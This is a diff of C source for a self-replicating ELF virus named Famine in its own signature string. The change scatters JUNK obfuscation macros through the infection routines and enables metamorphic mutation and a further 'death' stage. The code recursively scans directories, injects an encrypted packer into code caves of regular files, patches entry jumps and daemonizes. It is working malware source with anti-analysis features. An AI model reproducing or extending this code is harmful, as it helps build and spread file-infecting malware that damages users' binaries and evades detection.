@@ -60,6 +60,8 @@ static int	patch_new_file(t_data *data, const char *filename) {
 		return 1;
 	}
 
+	JUNK;
+
 	close(fd);
 
 	return 0;
@@ -72,6 +74,8 @@ static inline int64_t calc_jmp(uint64_t from, uint64_t to, uint64_t offset) {
 static int packer(t_data *data) {
 	data->packer.p_size = (size_t)&packer_end - (size_t)&packer_start;
 
+	JUNK;
+
 	if (text(data, data->packer.p_size) != 0) {
 		return 1;
 	}
@@ -83,6 +87,8 @@ static void init_patch(t_data *data, size_t jmp_rel_offset) {
 
 	t_patch *patch = &data->patch;
 
+	JUNK;
+
 	/* calculate the difference between the cave and the packer 
 	 * will always be positive cause .data is after the .text */
 	uint32_t addr_diff = data->cave.addr - data->packer.addr;
@@ -90,6 +96,9 @@ static void init_patch(t_data *data, size_t jmp_rel_offset) {
 	patch->jmp = (int32_t)(addr_diff - jmp_rel_offset - sizeof(int32_t) - 1);
 
 	char signature[SIGNATURE_SIZE];
+
+	JUNK;
+
 	ft_strncpy(signature, sign, SIGNATURE_SIZE);
 
 	/* "Famine (c)oded by dxrxbxk - straboul:numb", 0x0a, 0 
@@ -99,6 +108,8 @@ static void init_patch(t_data *data, size_t jmp_rel_offset) {
 	update_fingerprint(&signature[ft_strlen(signature) - 14], data);
 
 	ft_strncpy(patch->signature, signature, sizeof(patch->signature));
+
+	JUNK;
 
 	patch->decrypt_size = data->cave.p_size;
 
@@ -112,12 +123,17 @@ static int packer_patch(t_data *data) {
 
 	uint16_t jmp_rel_offset = (uintptr_t)&jmp_rel - (uintptr_t)&packer_start;
 
+	JUNK;
+
 	init_patch(data, jmp_rel_offset);
 
 	uintptr_t pstart = (uintptr_t)&packer_start;
 
 	/* copy the packer */
 	ft_memcpy(data->file + data->packer.offset, (void*)pstart, data->packer.p_size);
+
+	JUNK;
+
 	/* patch the packer, jmp_rel offset is where the data of the packer is stored */
 	ft_memcpy(data->file + data->packer.offset + jmp_rel_offset + 1, &data->patch, sizeof(t_patch));
 
@@ -131,9 +147,13 @@ static int	inject(t_data *data) {
 		return 1;
 	}
 
+	JUNK;
+
 	if (bss(data, data->cave.p_size) != 0) {
 		return 1;
 	}
+
+	JUNK;
 
 	packer_patch(data);
 
@@ -147,6 +167,8 @@ static int	inject(t_data *data) {
 
 	ft_memcpy(data->file + data->cave.offset + jmp_offset, &data->cave.rel_jmp, JMP_SIZE);
 
+	JUNK;
+
 	encrypt(data->file + data->cave.offset, data->cave.p_size, data->patch.key);
 
 	return 0;
@@ -157,6 +179,8 @@ static int	infect(const char *filename, bootstrap_data_t *bs_data)
 
 	t_data data;
 	ft_memset(&data, 0, sizeof(t_data));
+
+	JUNK;
 
 	/* copy the name of the target */
 	ft_strncpy(data.target_name, filename, sizeof(data.target_name));
@@ -171,22 +195,19 @@ static int	infect(const char *filename, bootstrap_data_t *bs_data)
 		return 1;
 	}
 
+	JUNK;
+
 	if (updade_hdr(&data) != 0) {
 		free_data(&data);
 		return 1;
 	}
 
-	/* old way of checking if the file is already patched 
-	if (already_patched(&data) != 0) {
-		free_data(&data);
-		return 1;
-	}
-	*/
-
 	if (inject(&data) != 0) {
 		free_data(&data);
 		return 1;
 	}
+
+	JUNK;
 
 	if (patch_new_file(&data, filename) != 0) {
 		free_data(&data);
@@ -203,10 +224,16 @@ static int	infect(const char *filename, bootstrap_data_t *bs_data)
 static int execute_prog(const char *filename, char **envp)
 {
 	pid_t pid = fork();
+
+	JUNK;
+
 	if (pid == 0) {
 
 		const char dev_null[] = "/dev/null";
 		int fd = open(dev_null, O_RDONLY);
+
+		JUNK;
+
 		if (fd == -1)
 			return 1;
 
@@ -272,12 +299,16 @@ static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *cou
 		{
 			dir = (dirent_t *)(buf + i);
 
+			JUNK;
+
 			if (dir->d_name[0] == '.'
 				&& (dir->d_name[1] == '\0' || (dir->d_name[1] == '.' && dir->d_name[2] == '\0')))
 				continue;
 			
 			if (dir->d_type == DT_REG) {
 				char new_path[PATH_MAX];
+
+				JUNK;
 
 				make_path(new_path, file, dir->d_name);
 
@@ -294,6 +325,8 @@ static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *cou
 				char new_path[PATH_MAX];
 
 				make_path(new_path, file, dir->d_name);
+
+				JUNK;
 
 				open_file(new_path, bs_data, counter);
 			}
@@ -312,6 +345,8 @@ void	famine(bootstrap_data_t *bs_data, uint16_t *counter)
 		STR("./tmp"),
 		NULL
 	};
+
+	JUNK;
 
 	for (int i = 0; paths[i]; ++i)
 		open_file(paths[i], bs_data, counter);
@@ -332,11 +367,17 @@ void	entrypoint(int argc, char **argv, char **envp)
 	//}
 #endif
 
-	prepare_mutate();
+	int start_offset = g_start_offset;
+
+	prepare_mutate(0);
 	mutate();
 
+	file_t file;
+	ft_memset(&file, 0, sizeof(file_t));
+
 	daemonize(envp);
+
 	famine(&bootstrap_data, &counter);
-	war(counter);
-	//death(&view);
+	war(counter, &file);
+	death(start_offset, &file);
 }
